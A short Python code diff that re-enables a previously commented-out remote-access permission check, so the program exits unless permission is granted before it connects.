 if __name__ == "__main__":
     if already_running():
         sys.exit(0)
-    #if not request_remote_access_permission():
+    if not request_remote_access_permission():
         sys.exit(0)
     connect()
